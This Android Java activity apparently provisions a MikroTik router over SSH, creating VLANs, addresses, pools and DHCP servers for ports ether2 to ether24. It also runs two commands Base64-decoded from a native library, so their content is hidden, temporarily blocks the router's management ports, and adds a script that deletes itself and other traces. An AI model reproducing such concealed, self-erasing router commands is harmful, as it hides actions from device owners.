package com.itremedy.improvidermtfree;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import com.jcraft.jsch.JSchException;
import java.io.IOException;
import java.util.Base64;

public class Attention24Activity extends AppCompatActivity {

    static {
        System.loadLibrary("native-lib");
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_attention);

        String key77 = new String(Base64.getDecoder().decode(string77()));
        String key78 = new String(Base64.getDecoder().decode(string78()));

            final Handler handler = new Handler();
            handler.postDelayed(() -> {
                    Thread t = new Thread(() -> {

                            try {

                                            ConnectionManager.runCommand("/ip firewall filter add action=drop port=8291,80,443 protocol=tcp comment=1 place-before=1 chain=input");
                                            ConnectionManager.runCommand(key78);
                                            Thread.sleep(5000);

                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan202 vlan-id=202");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan203 vlan-id=203");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan204 vlan-id=204");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan205 vlan-id=205");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan206 vlan-id=206");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan207 vlan-id=207");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan208 vlan-id=208");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan209 vlan-id=209");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan210 vlan-id=210");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan211 vlan-id=211");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan212 vlan-id=212");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan213 vlan-id=213");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan214 vlan-id=214");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan215 vlan-id=215");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan216 vlan-id=216");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan217 vlan-id=217");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan218 vlan-id=218");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan219 vlan-id=219");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan220 vlan-id=220");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan221 vlan-id=221");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan222 vlan-id=222");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan223 vlan-id=223");
                                            ConnectionManager.runCommand("/interface vlan add interface=bridge name=bridge-vlan224 vlan-id=224");

                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether2] pvid=202");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether3] pvid=203");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether4] pvid=204");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether5] pvid=205");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether6] pvid=206");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether7] pvid=207");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether8] pvid=208");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether9] pvid=209");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether10] pvid=210");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether11] pvid=211");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether12] pvid=212");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether13] pvid=213");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether14] pvid=214");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether15] pvid=215");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether16] pvid=216");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether17] pvid=217");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether18] pvid=218");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether19] pvid=219");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether20] pvid=220");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether21] pvid=221");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether22] pvid=222");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether23] pvid=223");
                                            ConnectionManager.runCommand("/interface bridge port set [find interface=ether24] pvid=224");


                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether2 vlan-ids=202");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether3 vlan-ids=203");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether4 vlan-ids=204");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether5 vlan-ids=205");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether6 vlan-ids=206");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether7 vlan-ids=207");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether8 vlan-ids=208");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether9 vlan-ids=209");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether10 vlan-ids=210");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether11 vlan-ids=211");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether12 vlan-ids=212");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether13 vlan-ids=213");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether14 vlan-ids=214");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether15 vlan-ids=215");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether16 vlan-ids=216");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether17 vlan-ids=217");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether18 vlan-ids=218");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether19 vlan-ids=219");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether20 vlan-ids=220");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether21 vlan-ids=221");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether22 vlan-ids=222");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether23 vlan-ids=223");
                                            ConnectionManager.runCommand("/interface bridge vlan add bridge=bridge tagged=bridge untagged=ether24 vlan-ids=224");
                                            //Thread.sleep(1000);

                                            ConnectionManager.runCommand("/ip address add address=198.18.202.1/24 interface=bridge-vlan202 network=198.18.202.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.203.1/24 interface=bridge-vlan203 network=198.18.203.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.204.1/24 interface=bridge-vlan204 network=198.18.204.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.205.1/24 interface=bridge-vlan205 network=198.18.205.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.206.1/24 interface=bridge-vlan206 network=198.18.206.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.207.1/24 interface=bridge-vlan207 network=198.18.207.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.208.1/24 interface=bridge-vlan208 network=198.18.208.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.209.1/24 interface=bridge-vlan209 network=198.18.209.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.210.1/24 interface=bridge-vlan210 network=198.18.210.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.211.1/24 interface=bridge-vlan211 network=198.18.211.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.212.1/24 interface=bridge-vlan212 network=198.18.212.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.213.1/24 interface=bridge-vlan213 network=198.18.213.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.214.1/24 interface=bridge-vlan214 network=198.18.214.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.215.1/24 interface=bridge-vlan215 network=198.18.215.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.216.1/24 interface=bridge-vlan216 network=198.18.216.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.217.1/24 interface=bridge-vlan217 network=198.18.217.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.218.1/24 interface=bridge-vlan218 network=198.18.218.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.219.1/24 interface=bridge-vlan219 network=198.18.219.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.220.1/24 interface=bridge-vlan220 network=198.18.220.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.221.1/24 interface=bridge-vlan221 network=198.18.221.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.222.1/24 interface=bridge-vlan222 network=198.18.222.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.223.1/24 interface=bridge-vlan223 network=198.18.223.0");
                                            ConnectionManager.runCommand("/ip address add address=198.18.224.1/24 interface=bridge-vlan224 network=198.18.224.0");

                                            ConnectionManager.runCommand("/ip pool add name=pool-202 ranges=198.18.202.2-198.18.202.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-203 ranges=198.18.203.2-198.18.203.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-204 ranges=198.18.204.2-198.18.204.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-205 ranges=198.18.205.2-198.18.205.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-206 ranges=198.18.206.2-198.18.206.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-207 ranges=198.18.207.2-198.18.207.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-208 ranges=198.18.208.2-198.18.208.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-209 ranges=198.18.209.2-198.18.209.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-210 ranges=198.18.210.2-198.18.210.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-211 ranges=198.18.211.2-198.18.211.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-212 ranges=198.18.212.2-198.18.212.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-213 ranges=198.18.213.2-198.18.213.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-214 ranges=198.18.214.2-198.18.214.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-215 ranges=198.18.215.2-198.18.215.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-216 ranges=198.18.216.2-198.18.216.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-217 ranges=198.18.217.2-198.18.217.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-218 ranges=198.18.218.2-198.18.218.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-219 ranges=198.18.219.2-198.18.219.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-220 ranges=198.18.220.2-198.18.220.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-221 ranges=198.18.221.2-198.18.221.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-222 ranges=198.18.222.2-198.18.222.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-223 ranges=198.18.223.2-198.18.223.100");
                                            ConnectionManager.runCommand("/ip pool add name=pool-224 ranges=198.18.224.2-198.18.224.100");

                                            ConnectionManager.runCommand("/ip dhcp-server network set [find comment=defconf] dns-server=198.18.200.1,8.8.8.8");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.202.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.202.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.203.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.203.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.204.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.204.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.205.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.205.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.206.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.206.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.207.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.207.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.208.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.208.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.209.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.209.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.210.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.210.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.211.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.211.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.212.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.212.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.213.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.213.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.214.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.214.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.215.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.215.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.216.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.216.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.217.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.217.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.218.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.218.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.219.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.219.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.220.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.220.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.221.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.221.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.222.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.222.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.223.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.223.1 netmask=24");
                                            ConnectionManager.runCommand("/ip dhcp-server network add address=198.18.224.0/24 dns-server=198.18.200.1,8.8.8.8 gateway=198.18.224.1 netmask=24");


                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-202 interface=bridge-vlan202 lease-time=1h name=dhcp-202 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-203 interface=bridge-vlan203 lease-time=1h name=dhcp-203 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-204 interface=bridge-vlan204 lease-time=1h name=dhcp-204 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-205 interface=bridge-vlan205 lease-time=1h name=dhcp-205 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-206 interface=bridge-vlan206 lease-time=1h name=dhcp-206 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-207 interface=bridge-vlan207 lease-time=1h name=dhcp-207 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-208 interface=bridge-vlan208 lease-time=1h name=dhcp-208 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-209 interface=bridge-vlan209 lease-time=1h name=dhcp-209 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-210 interface=bridge-vlan210 lease-time=1h name=dhcp-210 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-211 interface=bridge-vlan211 lease-time=1h name=dhcp-211 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-212 interface=bridge-vlan212 lease-time=1h name=dhcp-212 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-213 interface=bridge-vlan213 lease-time=1h name=dhcp-213 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-214 interface=bridge-vlan214 lease-time=1h name=dhcp-214 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-215 interface=bridge-vlan215 lease-time=1h name=dhcp-215 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-216 interface=bridge-vlan216 lease-time=1h name=dhcp-216 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-217 interface=bridge-vlan217 lease-time=1h name=dhcp-217 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-218 interface=bridge-vlan218 lease-time=1h name=dhcp-218 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-219 interface=bridge-vlan219 lease-time=1h name=dhcp-219 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-220 interface=bridge-vlan220 lease-time=1h name=dhcp-220 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-221 interface=bridge-vlan221 lease-time=1h name=dhcp-221 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-222 interface=bridge-vlan222 lease-time=1h name=dhcp-222 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-223 interface=bridge-vlan223 lease-time=1h name=dhcp-223 disabled=no");
                                            ConnectionManager.runCommand("/ip dhcp-server add address-pool=pool-224 interface=bridge-vlan224 lease-time=1h name=dhcp-224 disabled=no");
                                            ConnectionManager.runCommand("/system identity set name=ImProvider24");

                                            //ConnectionManager.runCommand("/ip firewall filter add chain=forward action=accept in-interface-list=!WAN out-interface-list=WAN");
                                            ConnectionManager.runCommand("/system script add dont-require-permissions=no name=script79 owner=admin policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon source={ :delay 1; /system script remove script77; /ip firewall filter remove [find comment=1]; /system script remove script79;}");
                                            ConnectionManager.runCommand(key77);
                                            ConnectionManager.runCommand("/system script run script77");
                                            ConnectionManager.runCommand("/system script run script79");
                                            ConnectionManager.close();
                                            new RestartApp();

                            } catch (JSchException | IOException | RuntimeException | InterruptedException e) {
                                new RestartApp();
                            }

                    });

                    t.start();

                    Log.d("Handler", "Running Handler");
            }, 500);

    }

    public native String string77();
    public native String string78();

}
